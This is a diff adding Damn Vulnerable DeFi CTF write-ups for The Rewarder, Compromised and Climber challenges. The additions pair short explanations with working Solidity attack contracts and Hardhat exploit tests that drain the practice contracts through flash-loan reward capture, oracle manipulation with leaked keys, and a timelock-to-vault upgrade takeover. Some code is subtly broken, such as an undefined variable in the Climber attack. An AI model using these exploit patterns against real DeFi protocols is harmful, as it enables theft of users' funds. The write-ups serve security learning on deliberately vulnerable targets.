@@ -107,8 +107,47 @@ By calling, attackSideEntranceLenderPool, we execute flashLoan, and during flash
 ### Challenge points => so users know the chall’s difficulty
 
 
-In this challenge, we must to claim most rewards for ourselves with no DVT token. The challenge also provides flash loan and reward pool. We need to keep an eye on reward pool, `TheRewarderPool.sol`. After deposit DVT token for 5 days, we can get rewards. However, there are already rewards in the pool from previous round, and rewarders have not claimed the reward. It means that 
+In this challenge, we must claim most rewards for ourselves with no DVT token. The challenge also provides flash loan and reward pool. We need to keep an eye on reward pool, `TheRewarderPool.sol`. After deposit DVT token for 5 days, we can get rewards. However, there are already rewards in the pool from previous round, and rewarders have not claimed the reward. 
+If we flashloan massive amount of DVT, and deposit to the rewarder pool, we will get most of the reward token.
 
+First, we will borrow max amount of DVT from flashloan, and we will deposit it to rewarder pool. `deposit()` function will trigger `distributeRewards()` function, and since we have deposited very large amount of DVT the it will mint most of reward token. This is possible because `_hasRetrievedReward()` function can not fully validate retrieved address. Finally, we just repay flash loan, and send reward token to attacker. Here is attack contract:ß
+
+
+```solidity
+contract AttackTheRewarder {
+    
+    address flashLoanerPool;
+    address theRewarderPool;
+    address rewardToken;
+    address liquidity;
+    address owner;
+
+    constructor(address _flashLoanerPool, address _rewardToken, address _liquidity, address _theRewarderPool) {
+        flashLoanerPool = _flashLoanerPool;
+        rewardToken = _rewardToken;
+        liquidity = _liquidity;
+        theRewarderPool = _theRewarderPool;
+        owner = msg.sender;
+    }
+
+    function attackTheRewarder() public {
+        uint256 amount = DamnValuableToken(liquidity).balanceOf(flashLoanerPool);
+        FlashLoanerPool(flashLoanerPool).flashLoan(amount);
+    }
+
+    function receiveFlashLoan(uint256 amount) public {
+        DamnValuableToken(liquidity).approve(theRewarderPool, amount);
+
+        TheRewarderPool(theRewarderPool).deposit(amount);
+        TheRewarderPool(theRewarderPool).withdraw(amount);
+
+        DamnValuableToken(liquidity).transfer(flashLoanerPool, amount);
+
+        uint256 rewardAmount = RewardToken(rewardToken).balanceOf(address(this));
+        RewardToken(rewardToken).transfer(owner, rewardAmount);
+    }
+}
+```
 
 - - -
 ## CTF name: Damn Vulnerable DeFi
@@ -162,12 +201,50 @@ First, by calling `attackTheSelfiePool()` function, we can get flash loan, and d
 - - -
 ## CTF name: Damn Vulnerable DeFi
 ### Challenge name: Compromised
-### Challenge description:
+### Challenge descrisption:
 ### Challenge category => so users know the chall’s field
 ### Challenge points => so users know the chall’s difficulty
 
+In this challenge, our goal is to steal all ETH available in the exchange contract. We have received an strange responses from their server which could converted into private keys. We can convert bytes to string, and decode it with base64. It will get us the private keys
 
+After we get private keys, we can access to the accounts freely, and we know the those accounts are two of the trusted account. Since trusted wallets are in charge of oracle, we can manipulate it. 
 
+To drain exchange contract, first we need to change the NFT price to 0 by using `postPrice()` function. Since the price of NFT is median of the 3 account's setted price, the price will be 0. Then we need to buy a NFT at price 0 with `buyOne()` function. After buying, we need to change the price of NFT to the exchange contract's balance. By approving exchange contract we now can sell NFT to exchange contract with contract's balance, and it will drain all ETH from the contract. Lastly, we need to set the price to inital price.
+
+Here is exploit code:
+
+```js
+    it('Exploit', async function () {        
+        /** CODE YOUR EXPLOIT HERE */
+        const priKey1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";
+        const priKey2 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34";
+
+        let priKey1ToBase64 = Buffer.from(priKey1.split(' ').join(''),'hex').toString('utf-8');
+        let priKey1ToHex = Buffer.from(priKey1ToBase64,'base64').toString('utf-8');
+        
+        let priKey2ToBase64 = Buffer.from(priKey2.split(' ').join(''),'hex').toString('utf-8');
+        let priKey2ToHex = Buffer.from(priKey2ToBase64,'base64').toString('utf-8');
+
+        let TrustedSource1 = new ethers.Wallet(priKey1ToHex, ethers.provider);
+        let TrustedSource2 = new ethers.Wallet(priKey2ToHex, ethers.provider);
+        console.log("TrustedSource1: ", TrustedSource1.address);
+        console.log("TrustedSource2: ", TrustedSource2.address);
+        
+        await this.oracle.connect(TrustedSource1).postPrice("DVNFT", 0);
+        await this.oracle.connect(TrustedSource2).postPrice("DVNFT", 0);
+
+        await this.exchange.connect(attacker).buyOne({value: 1});
+    
+        await this.oracle.connect(TrustedSource1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE)
+        await this.oracle.connect(TrustedSource2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE)
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        await this.oracle.connect(TrustedSource1).postPrice("DVNFT", INITIAL_NFT_PRICE)
+        await this.oracle.connect(TrustedSource2).postPrice("DVNFT", INITIAL_NFT_PRICE)
+    });
+```
 
 
 - - -
@@ -307,5 +384,121 @@ In `uniswapV2Call()` function, first withdraw ETH from WETH contract. Secondly, 
 ### Challenge points => so users know the chall’s difficulty
 
 
-In this challenge, our goal is to empty the vault. 
- 
+In this challenge, our goal is to empty the vault. We must to know about UUPS upgrade concept to solve this challenge. Firstly, the vulnerability is found in `Timelock` contract. The `execute()` function does not follows Checks Effects Interactions pattern.
+
+```solidity
+    // lines in execute()
+    for (uint8 i = 0; i < targets.length; i++) {
+        targets[i].functionCallWithValue(dataElements[i], values[i]);
+    }
+    
+    require(getOperationState(id) == OperationState.ReadyForExecution);
+```
+
+This code allows us to make a schedule for execution before require statement, which means we can call `execute()` function first, and then add schedule that matches `operationId`. Also, during execution, we can call any function we want with address of __timelock contract__. To go through the require statement, first we need to call `updateDelay()` function with parameter `0`. Then set the attack contract to have proposer role, and call `transferOwnership()` to set the vault owner to be attack contract. Lastly, call `schedule()` function. Here is the attack contract.
+
+```solidity
+
+contract ClimberAttacker {
+
+    address payable public climberTimelock;
+    address payable public climberVault;
+    address public token;
+
+    address[] public targets;
+    uint256[] public values;
+    bytes[] public data;
+
+    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
+    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
+
+    constructor(address payable _climberTimelock, address payable _climberVault, address _token){
+        token = _token;
+        climberTimelock = _climberTimelock;
+        climberVault = _climberVault;
+    }
+
+    function attack() public {
+
+        targets.push(climberTimelock);
+        values.push(0);
+        data.push((abi.encodeWithSignature("updateDelay(uint64)", uint64(0))));
+
+        targets.push(climberTimelock);
+        values.push(0);
+        data.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));
+
+        targets.push(climberVault);
+        values.push(0);
+        data.push(abi.encodeWithSignature("transferOwnership(address)", address(this)));
+        
+        targets.push(address(this));
+        values.push(0);
+        data.push(abi.encodeWithSignature("schedule()"));
+
+        
+        (bool success, ) = climberTimelock.call(
+            abi.encodeWithSignature("execute(address[],uint256[],bytes[],bytes32)", targets, values, dataElements, bytes32(0))
+        );
+        require(success, "execute failed");
+    }
+
+    function schedule() public {
+        ClimberTimelock(climberTimelock).schedule(targets, values, data, bytes32(0));
+    }
+
+    function upgradeVault(address _newImp) public{
+        ClimberVault(climberVault).upgradeTo(_newImp);
+    }
+    function sweepFunds(address _token) public {
+        ClimberVaultAttackUpgrade(climberVault).sweepFunds(_token);
+    }
+}
+```
+
+In attack contract there are more functions that I have not explained. Since we became the owner of vault contract, we can upgrade vault contract to our new logic contract, so I built a new logic contract that allow us to sweep all the funds.
+
+```solidity
+contract ClimberVaultAttackUpgrade is Initializable, OwnableUpgradeable, UUPSUpgradeable{
+
+    //constructor() initializer {}
+    uint256 private _lastWithdrawalTimestamp;
+    address private _sweeper;
+    address public attacker;
+
+    function initialize(address _attacker) initializer external {
+        __Ownable_init();
+        __UUPSUpgradeable_init();
+    }
+
+    function sweepFunds(address tokenAddress) public {
+        IERC20 token = IERC20(tokenAddress);
+        require(token.transfer(tx.origin, token.balanceOf(address(this))), "Transfer failed");
+    }
+
+    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
+
+}
+```
+
+Lastly, here is script I used to exploit the vault.
+
+```js
+    it('Exploit', async function () {        
+        /** CODE YOUR EXPLOIT HERE */
+        this.attackContract = await (await ethers.getContractFactory('ClimberAttacker', attacker)).deploy(this.timelock.address, this.vault.address, this.token.address);
+        this.attackUpgradableContract = await (await ethers.getContractFactory('ClimberVaultAttackUpgrade')).deploy();
+
+        await this.attackContract.connect(attacker).attack();
+        this.attackContract.connect(attacker).upgradeVault(this.attackUpgradableContract.address);
+        this.attackContract.connect(attacker).sweepFunds(this.token.address)
+    });
+```
+
+
+- - -
+## CTF name: Damn Vulnerable DeFi
+### Challenge name: Safe miners 
+### Challenge description:
+### Challenge category => so users know the chall’s field
+### Challenge points => so users know the chall’s difficulty
